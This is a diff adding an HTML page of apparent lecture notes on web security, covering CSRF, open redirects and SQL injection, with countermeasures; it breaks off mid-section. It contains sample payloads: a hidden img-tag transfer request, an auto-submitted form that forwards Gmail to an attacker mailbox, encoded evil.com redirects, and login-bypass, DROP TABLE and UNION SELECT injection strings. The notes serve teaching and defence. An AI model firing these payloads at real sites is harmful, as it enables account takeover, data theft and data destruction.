@@ -1,0 +1,1704 @@
+<!DOCTYPE html>
+<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.72.0" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="light dark">
+<meta name="supported-color-schemes" content="light dark"><title>Web security&nbsp;&ndash;&nbsp;MM3* lab</title><meta name="description" content="A brief description of Hugo Shortcodes" /><link rel="stylesheet" href="/css/core.min.ab0d3a5e22e3151993291f6d9b37cc3b84ccda3453f319de36b3694f9fbe6554d6330ff9f681e7aacbd495939a9c0262.css" integrity="sha384-qw06XiLjFRmTKR9tmzfMO4TM2jRT8xneNrNpT5&#43;&#43;ZVTWMw/59oHnqsvUlZOanAJi"><meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Web security" />
+<link href="https://fonts.googleapis.com/css2?family=EB+Garamond:ital,wght@0,600;0,700;1,600;1,700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Marcellus+SC&display=swap" rel="stylesheet">
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/img/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/img/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/img/favicon-16x16.png">
+<link rel="manifest" href="img/site.webmanifest">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#fff">
+<body><section id="header">
+    <div class="header wrap"><span class="header left-side"><a class="site home" href="/"><span class="site name">MM3* lab</span></a></span>
+        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/categories/">Categories</a><a class="nav item" href="/tags/">Tags</a><a class="nav item" href="/projects/">Projects</a><a class="nav item" href="/about/">About</a><a class="mode iconfont icon-adjust"></a>
+</nav></div></span></div><div class="site slogan"><span class="title">- Cryptography, Security, Privacy - </span></div></section><section id="content"><div class="article-container"><section class="article header">
+    <h1 class="article title">Web security</h1><p class="article date">Mar 10, 2019</p></section><article class="article markdown-body"><h1 id="12-web-security">12. Web Security</h1>
+<h4 id="121-intro">12.1 Intro</h4>
+<p>Big trend =&gt; Software as a Web-based service</p>
+<ul>
+<li>
+<p>Online banking, shopping, government, bill payment, tax prep, customer relationship management, etc.</p>
+</li>
+<li>
+<p>Cloud computing</p>
+</li>
+</ul>
+<p>But, Security =&gt; poor</p>
+<ul>
+<li>
+<p>Poorly written scripts with inadequate input validation</p>
+</li>
+<li>
+<p>Sensitive data stored in world-readable files</p>
+</li>
+</ul>
+<hr>
+<h5 id="typical-web-application">Typical Web Application</h5>
+<ul>
+<li>
+<p>Written in a mixture of <strong>PHP</strong>, Java, JavaScript, Python, C, Go, &hellip;</p>
+</li>
+<li>
+<p>Runs on a Web server or Application Server</p>
+</li>
+<li>
+<p>Interacts with back-end databases and third parties</p>
+</li>
+<li>
+<p>Prepares and outputs results for users</p>
+</li>
+<li>
+<p>Dynamically generated HTML pages</p>
+<p>Or generates data and let’s the client build HTML pages</p>
+</li>
+</ul>
+<h5 id="architecture-of-web-deployment">Architecture of Web Deployment</h5>
+<img src="file:///Users/rozen/Desktop/ITS/2020SS/3%20IT-Sicherheit/note/img/1593014786143.jpg" title="" alt="1593014786143.jpg" width="605">
+<ol>
+<li>
+<p><mark>User devices</mark></p>
+<ul>
+<li>
+<p>Workstations, Laptops, Smartphones, Tablets, Others (e.g., Smart Home)</p>
+</li>
+<li>
+<p>Other services: 3rd Party Provider</p>
+</li>
+</ul>
+</li>
+<li>
+<p><mark>Web-Server</mark> Apache, Nginx, Lighttpd &hellip;</p>
+<p><mark>App-Server</mark></p>
+<ul>
+<li>
+<p>IBM Websphere, JBoss, Apache Glassfish&hellip; (Java)</p>
+</li>
+<li>
+<p>Zend &hellip; (PHP)</p>
+</li>
+<li>
+<p>Gunicorn, Zope &hellip; (Python)</p>
+</li>
+</ul>
+</li>
+<li>
+<p><mark>DBMS </mark></p>
+<ul>
+<li>
+<p>MySQL, Postgresql, Oracle DB, Others (e.g. mongodb)</p>
+</li>
+<li>
+<p>Other services: Cloud, Storage Prov.</p>
+</li>
+</ul>
+</li>
+</ol>
+<h5 id="vulnerabilities">Vulnerabilities</h5>
+<table>
+<thead>
+<tr>
+<th align="left">Client</th>
+<th>&lt;=&gt;</th>
+<th>Web-Server</th>
+<th>&lt;=&gt;</th>
+<th>SQL-Database</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">Phishing</td>
+<td>Sniffing</td>
+<td>Buffer Overflows</td>
+<td>Internal attacks</td>
+<td>SQL Injection</td>
+</tr>
+<tr>
+<td align="left">Spoofing</td>
+<td>Man-in-the-Middle</td>
+<td>Directory Traversal</td>
+<td>Command</td>
+<td></td>
+</tr>
+<tr>
+<td align="left">XSS</td>
+<td>DNS Rebinding</td>
+<td>Weak Passwords</td>
+<td>Injection</td>
+<td></td>
+</tr>
+<tr>
+<td align="left">Clickjacking</td>
+<td>Session Hijacking</td>
+<td>Standard Accounts</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td align="left">Session Riding</td>
+<td></td>
+<td>Blacklisting</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>Reasons:</p>
+<ul>
+<li>
+<p>User is not educated to understand risks</p>
+</li>
+<li>
+<p>Not patched applications</p>
+</li>
+<li>
+<p>Zero day (knowledge) vulnerability</p>
+</li>
+<li>
+<p>Ignorance or inexperience of programmers</p>
+</li>
+</ul>
+<img src="https://erpscan.io/wp-content/uploads/2016/03/Top-vuln-in-SAP.png" title="" alt="" width="467">
+<h4 id="122-owasp-top-10-vulnabilities">12.2 OWASP (TOP 10 vulnabilities)</h4>
+<p>OWASP = The Open Web Application Security Project, released a list of 10 vulnerabiluties, latest 2017.</p>
+<img title="" src="file:///Users/rozen/Desktop/ITS/2020SS/3%20IT-Sicherheit/note/img/1593184171106.jpg" alt="1593184171106.jpg" width="553">
+<h5 id="1221-cross-site-request-forgery-csrf-跨站请求伪造">12.2.1 Cross-Site Request Forgery (CSRF) 跨站请求伪造</h5>
+<p>a.k.a One Click Attack / Session Riding</p>
+<ul>
+<li>
+<p>Forces user&rsquo;s browser to send an <u>unauthorized request</u> to a <u>website that the user is currently authenticated to</u></p>
+</li>
+<li>
+<p>Security problem is due to <strong>the statelessness of HTTP</strong></p>
+</li>
+</ul>
+<img title="" src="file:///Users/rozen/Desktop/ITS/2020SS/3%20IT-Sicherheit/note/img/1593184459231.jpg" alt="1593184459231.jpg" width="486">
+<h6 id="how-it-works">How it works?</h6>
+<ul>
+<li>
+<p>Since request are performed by the user&rsquo;s browser, all cookies will be submitted to the website</p>
+</li>
+<li>
+<p><strong>Session identifiers</strong> and <strong>all authentication tokens</strong> will be also submitted</p>
+</li>
+</ul>
+<p>e.g. Attack Vector<code>&lt;img&gt;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;www.bank.com/transfer?acct=1234&amp;amount=1000&#34;</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&#34;visibility: hidden;&#34;</span> <span class="nx">width</span><span class="o">=</span><span class="s2">&#34;1&#34;</span> <span class="nx">height</span><span class="o">=</span><span class="s2">&#34;1&#34;</span><span class="o">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><img src="file:///Users/rozen/Desktop/ITS/2020SS/3%20IT-Sicherheit/note/img/1593187405558.jpg" title="" alt="1593187405558.jpg" width="421">
+<p>e.g. Attack Vector<code>&lt;script&gt;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">method</span><span class="o">=</span><span class="s2">&#34;POST&#34;</span> <span class="nx">action</span><span class="o">=</span><span class="s2">&#34;https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf&#34;</span> <span class="nx">enctype</span><span class="o">=</span><span class="s2">&#34;multipart/form-data&#34;</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;hidden&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;cf2_email&#34;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&#34;evilinbox@mailinator.com&#34;</span><span class="o">/&gt;</span> 
+<span class="o">&lt;</span><span class="err">/form&gt;</span>
+<span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span> 
+    <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span> 
+<span class="o">&lt;</span><span class="err">/script&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><img title="" src="file:///Users/rozen/Desktop/ITS/2020SS/3%20IT-Sicherheit/note/img/1593189906821.jpg" alt="1593189906821.jpg" width="422">
+<h6 id="countermeasures">Countermeasures</h6>
+<ul>
+<li>
+<p>Additional PIN/TAN input</p>
+</li>
+<li>
+<p>Random (<strong>one-time</strong>) tokens associated with the user&rsquo;s current session</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">action</span><span class="o">=</span><span class="s2">&#34;www.bank.com/transfer&#34;</span> <span class="nx">method</span><span class="o">=</span><span class="s2">&#34;post&#34;</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;hidden&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;token&#34;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&#34;fjtiJ35Vmub82sRMvO14fjvnDHf3mm7feR&#34;</span><span class="o">&gt;</span> 
+<span class="p">...</span>
+<span class="o">&lt;</span><span class="err">/form&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<ul>
+<li>
+<p>Double Submit Cookies</p>
+<ul>
+<li>
+<p>Store cryptographically strong random value in a <strong>cookie</strong></p>
+</li>
+<li>
+<p><strong>Site matching a token</strong> sent as a form value and compare with the token in cookie</p>
+</li>
+<li>
+<p>Due to the same origin policy, attacker can not modify the value in the cookie (or read it e.g. HttpOnly)</p>
+</li>
+</ul>
+</li>
+<li>
+<p>Verify the Referrer HTTP header <span style="color:red"> (not really a solution)</span></p>
+<ul>
+<li>
+<p>Rejecting sensitive requests with a Referrer of a different URL</p>
+</li>
+<li>
+<p>Limitation: Requests can omit the Referrer header</p>
+<p>(no specification, proxies or old user agents commonly strip it away)</p>
+</li>
+</ul>
+</li>
+<li>
+<p>Enter additional secure password (over HTTPS)</p>
+</li>
+</ul>
+<h6 id="mitigration">Mitigration</h6>
+<ul>
+<li>
+<p>Session time out after a period of inactivity</p>
+</li>
+<li>
+<p>Confirmation of actions</p>
+<ul>
+<li>&ldquo;Are you sure you want to transfer $1000?&rdquo;</li>
+</ul>
+</li>
+<li>
+<p>Client/User Side</p>
+<ul>
+<li>
+<p>Logoff after using a web service</p>
+</li>
+<li>
+<p>Do not save username/passwords in the browser</p>
+</li>
+<li>
+<p>Use different browsers to access sensitive applications</p>
+</li>
+<li>
+<p>Use Add-Ons like no-script to prevent POST based CSRF vulnerabilities to
+exploit</p>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="1222-unvalidated-redirects-forwards">12.2.2 Unvalidated Redirects Forwards</h5>
+<p>Redirects are used to redirect people from one URL to a new URL:</p>
+<ul>
+<li>
+<p>WEB SSO extensively uses redirect in the Service-Provider Initiated Scenario</p>
+</li>
+<li>
+<p>For marketing campaigns to track each advertisement</p>
+</li>
+</ul>
+<h6 id="different-types-of-redirects">Different types of Redirects</h6>
+<ul>
+<li>
+<p>Meta-Redirect</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="s2">&#34;refresh&#34;</span> <span class="nx">content</span><span class="o">=</span><span class="s2">&#34;15; url=http://www.example.de/&#34;</span><span class="o">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>JavaScript Redirect</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">language</span> <span class="o">=</span><span class="s2">&#34;JavaScript&#34;</span><span class="o">&gt;</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s2">&#34;http://www.example.de&#34;</span><span class="p">;</span> <span class="o">&lt;</span><span class="err">/script&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>.htaccess Redirect</p>
+</li>
+</ul>
+<p>HTTP response codes 300-307</p>
+<ul>
+<li>
+<p>301 Moved Permanently</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">Redirect</span> <span class="mi">301</span> <span class="o">/</span><span class="nx">folder</span><span class="o">/</span><span class="nx">example</span><span class="p">.</span><span class="nx">htm</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//www.example.com/
+</span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>302 Found</p>
+</li>
+<li>
+<p>307 Temporary Redirect</p>
+</li>
+</ul>
+<h6 id="scenario">Scenario</h6>
+<ol>
+<li>
+<p>The application has a page called &ldquo;redirect&rdquo; which takes a single parameter named &ldquo;url&rdquo; to redirect user to desired page. The attacker crafts a malicious URL that redirects users to a malicious site that performs phishing and installs malware.
+<code>http://www.example.com/redirect/?url=evil.com</code></p>
+</li>
+<li>
+<p>The application uses forward to route requests between different parts of the site. To
+facilitate this, some pages use a parameter to indicate where the user should be sent if a transaction is successful. In this case, the attacker crafts a URL that will pass the application&rsquo;s access control check and then forward the attacker to an administrative function that she normally would not be able to access.
+<code>http://www.example.com/boring/?fwd=admin</code></p>
+<img src="file:///Users/rozen/Desktop/ITS/2020SS/3%20IT-Sicherheit/note/img/1593202267253.jpg" title="" alt="1593202267253.jpg" width="229">
+</li>
+</ol>
+<h6 id="hiding-urls-with-encoding">Hiding URLs with encoding</h6>
+<ul>
+<li>
+<p><strong>URL encoding</strong> (or <strong>Percent encoding</strong>) can be used to encode <u>UTF-8</u> data
+as <u>ASCII string</u>.</p>
+</li>
+<li>
+<p>Basically the hex-value of the UTF-8 byte preceded by a %-sign</p>
+<p>E.g. ß (0xc3 0x9f) =&gt; %c3%9f</p>
+<p><code>http://evil.com =&gt; http://%65%76%69%6c%2e%63%6f%6d</code></p>
+</li>
+<li>
+<p>This makes it easy to hide the URL in a redirect:</p>
+<p><code>http://test.site/request/?url=%65%76%69%6c%2e%63%6f%6d</code></p>
+<p><code>http://test.site/request/? %75%72%6c%3d%65%76%69%6c%2e%63%6f%6d)</code></p>
+</li>
+</ul>
+<p>IDN(International Domain Name) homograph attack:</p>
+<h6 id="countermeasures-1">Countermeasures</h6>
+<ul>
+<li>
+<p>Safe use of redirects and forwards can be done in a number of ways</p>
+<ul>
+<li>
+<p><strong>Simply avoid</strong> using redirects and forwards</p>
+</li>
+<li>
+<p>If used, don&rsquo;t involve <strong>user input</strong> for the destination</p>
+</li>
+<li>
+<p>If destination parameters can&rsquo;t be avoided, ensure that the supplied <strong>value is valid</strong>, and <strong>authorized for the user</strong></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Any such destination parameter is only a mapping value, rather than the actual URL or portion of the URL</p>
+<ul>
+<li>
+<p>E.g. login is translated to <a href="http://www.example.com/login">www.example.com/login</a></p>
+</li>
+<li>
+<p>Server <strong>knows possible destinations</strong> <a href="http://www.example.com/login/user.php">www.example.com/login/user.php</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Avoiding such flaws is extremely important as they are a favorite target of phishers trying to gain the user&rsquo;s trust</p>
+</li>
+</ul>
+<h5 id="1223-injection">12.2.3 Injection</h5>
+<p>Injections / code injections happen when some applications or servers <u>interpret user supplied input</u>.</p>
+<p>This can happen with different applications and languages like:</p>
+<ul>
+<li>
+<p>SQL Injection (most common)</p>
+</li>
+<li>
+<p>JavaScript Code Injection</p>
+</li>
+<li>
+<p>XPath Injection</p>
+</li>
+<li>
+<p>LDAP Injection &hellip;</p>
+</li>
+</ul>
+<h6 id="sql-injection">SQL Injection</h6>
+<ol start="0">
+<li>
+<p>SQL</p>
+<ul>
+<li>
+<p>Structured Query Language (SQL) is the standard language for requests in relational database management systems (RDBMS).</p>
+</li>
+<li>
+<p>Used to: SELECT, INSERT, UPDATE and DELETE data as well as define schema of DB</p>
+</li>
+</ul>
+</li>
+<li>
+<p>SQL Injection</p>
+<ul>
+<li>
+<p>Consists of insertion or &ldquo;injection&rdquo; of a SQL query via the input data from the client to the application</p>
+<ul>
+<li>Mainly in the form of POST or GET method in the website</li>
+</ul>
+</li>
+<li>
+<p>Exploits poorly filtered or not correctly escaped SQL queries to run malicious code (&ldquo;buffer overflow&rdquo;)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">members</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s2">&#34;1&#34;</span><span class="p">;</span>             <span class="o">//</span><span class="k">before</span>
+<span class="k">UPDATE</span> <span class="n">members</span> <span class="k">SET</span> <span class="n">password</span><span class="o">=</span><span class="s2">&#34;123&#34;</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s2">&#34;1&#34;</span><span class="p">;</span> <span class="o">//</span><span class="k">after</span>
+</code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+</li>
+<li>
+<p>SQL Injection Objectives</p>
+<ul>
+<li>
+<p>SQL injection errors occur when:</p>
+<ul>
+<li>
+<p>Data enters a program from an <strong>untrusted source</strong></p>
+</li>
+<li>
+<p>The data is used to <strong>dynamically construct a SQL query</strong></p>
+</li>
+</ul>
+</li>
+<li>
+<p>A successful SQL injection exploit can:</p>
+<ul>
+<li>
+<p><strong>read sensitive</strong> data from the database <mark>~~(Confidentiality)~~</mark></p>
+</li>
+<li>
+<p><strong>modify database</strong> data (Insert/Update/Delete) <mark>~~(Integrity)~~</mark></p>
+</li>
+<li>
+<p><strong>execute administration operations</strong> on the database (such as shutdown the DBMS) <mark>~~(Availability)~~</mark></p>
+</li>
+<li>
+<p>in some cases <strong>issue command</strong>s to the <strong>operating system</strong></p>
+</li>
+</ul>
+<p>SQL and any platform that requires an interaction with a SQL database may be affected.</p>
+</li>
+</ul>
+</li>
+<li>
+<p>Example 1: Login Formhtml</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html">// index.html
+   <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;login.php&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span><span class="p">&gt;</span> 
+       <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;username&#34;</span><span class="p">&gt;</span> 
+       <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;password&#34;</span><span class="p">&gt;</span> 
+       <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Login&#34;</span><span class="p">&gt;</span>
+   <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python">   <span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM members WHERE username = &#39;&#34;</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s2">&#34;&#39; and password = &#39;&#34;</span> <span class="o">+</span> <span class="n">password</span> <span class="o">+</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
+<span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><table>
+<thead>
+<tr>
+<th>id</th>
+<th>username</th>
+<th>password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Karl</td>
+<td>3929849098423</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Bob</td>
+<td>2994984939939</td>
+</tr>
+</tbody>
+</table>
+</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="o">#</span> <span class="k">User</span> <span class="k">input</span> <span class="p">(</span><span class="n">intruder</span><span class="p">)</span>
+<span class="o">#</span> <span class="n">Username</span><span class="p">:</span> <span class="n">Bob</span> <span class="s1">&#39; OR &#39;</span><span class="n">x</span><span class="s1">&#39;=&#39;</span><span class="n">x</span>
+<span class="o">#</span> <span class="n">Password</span><span class="p">:</span> <span class="n">anything</span><span class="s1">&#39; OR &#39;</span><span class="mi">1</span><span class="s1">&#39;= &#39;</span><span class="mi">1</span>
+
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">members</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span> <span class="s1">&#39;Bob&#39;</span> <span class="k">OR</span> <span class="s1">&#39;x&#39;</span><span class="o">=</span><span class="s1">&#39;x&#39;</span> <span class="k">AND</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;anything&#39;</span>  <span class="k">OR</span> <span class="s1">&#39;1&#39;</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span> 
+<span class="o">#</span> <span class="n">Pseudo</span> <span class="n">code</span> <span class="k">after</span> <span class="n">login</span> <span class="k">function</span><span class="p">:</span>
+<span class="o">#</span> <span class="k">if</span> <span class="n">username</span> <span class="o">!=</span> <span class="k">null</span> <span class="o">=&gt;</span> <span class="n">login</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><ol start="4">
+<li>
+<p>Example 2: News Website</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM news WHERE news_id=&#39;&#34;</span> <span class="o">+</span> <span class="nb">id</span> <span class="o">+</span> <span class="s2">&#34;&#39;;&#34;</span>
+<span class="c1"># http://www.website.com/news.php?id=42</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="o">#</span> <span class="n">Inject</span> <span class="k">SQL</span> <span class="n">command</span> <span class="k">in</span> <span class="n">the</span> <span class="n">URL</span> <span class="k">of</span> <span class="n">the</span> <span class="n">website</span><span class="p">:</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">news</span> <span class="k">WHERE</span> <span class="n">news_id</span><span class="o">=</span><span class="s1">&#39;42&#39;</span><span class="p">;</span> <span class="k">DROP</span> <span class="k">TABLE</span> <span class="n">news</span><span class="p">;</span> <span class="o">#</span> <span class="s1">&#39;;
+</span><span class="s1"># http://www.website.com/news.php?id=42&#39;</span><span class="p">;</span> <span class="k">DROP</span> <span class="k">TABLE</span> <span class="n">news</span><span class="p">;</span> <span class="o">#</span>
+<span class="o">#</span> <span class="k">Result</span><span class="p">:</span>
+<span class="o">#</span>    <span class="k">Delete</span> <span class="n">whole</span> <span class="n">news</span> <span class="k">table</span>
+<span class="o">#</span>    <span class="o">#</span> <span class="o">=&gt;</span> <span class="k">ignore</span> <span class="n">the</span> <span class="n">rest</span> <span class="k">of</span> <span class="n">the</span> <span class="n">query</span> 
+</code></pre></td></tr></table>
+</div>
+</div><p>Other examples to block the rest of the query:</p>
+<ul>
+<li>
+<p>Semicolon as separator for the second query</p>
+</li>
+<li>
+<p>&ndash; is a comment, so that the last ( ' ) will be ignored</p>
+<p><code>' or '1'='1' -- ' ' or '1'='1' ({ ' ' or '1'='1' /* '</code></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Example 3: ProductPage.php</p>
+<p>input: <code>' UNION SELECT username, password FROM Users --</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="o">#</span> <span class="k">before</span>
+<span class="k">SELECT</span> <span class="n">ProductName</span><span class="p">,</span> <span class="n">Price</span> <span class="k">FROM</span> <span class="n">Products</span> <span class="k">WHERE</span> <span class="n">ProductName</span> <span class="k">LIKE</span> <span class="s1">&#39;$SearchBox&#39;</span><span class="p">;</span>
+<span class="o">#</span> <span class="k">after</span>
+<span class="k">SELECT</span> <span class="n">ProductName</span><span class="p">,</span> <span class="n">Price</span> <span class="k">FROM</span> <span class="n">Products</span> <span class="k">WHERE</span> <span class="n">ProductName</span> <span class="k">LIKE</span> <span class="s1">&#39;$SearchBox&#39;</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="k">FROM</span> <span class="n">Users</span> <span class="c1">--
+</span><span class="c1"></span><span class="o">#</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="n">allows</span> <span class="n">two</span> <span class="n">different</span> <span class="k">SQL</span> <span class="n">queries</span>
+<span class="o">#</span> <span class="n">The</span> <span class="k">result</span> <span class="k">of</span> <span class="n">this</span> <span class="n">query</span> <span class="k">is</span> <span class="n">a</span> <span class="k">table</span> <span class="k">with</span> <span class="n">two</span> <span class="n">columns</span><span class="p">,</span> <span class="n">containing</span> <span class="n">the</span> <span class="n">results</span> <span class="k">of</span> <span class="n">the</span> <span class="k">first</span> <span class="k">and</span> <span class="k">second</span> <span class="n">query</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The result of this query is a table with two columns, containing the results of the first and second query.</p>
+<img src="file:///Users/rozen/Desktop/ITS/2020SS/3%20IT-Sicherheit/note/img/1593256646863.jpg" title="" alt="1593256646863.jpg" width="525">
+</li>
+</ol>
+<h6 id="blind-sql-injection">Blind SQL Injection</h6>
+<p>SQL can be injected without seeing the output. This is called a <strong>blind SQL injection</strong>.</p>
+<ul>
+<li>
+<p><strong>Error-based blind SQL Injection</strong>:</p>
+<p>Abuse error messages to exfiltrate data</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
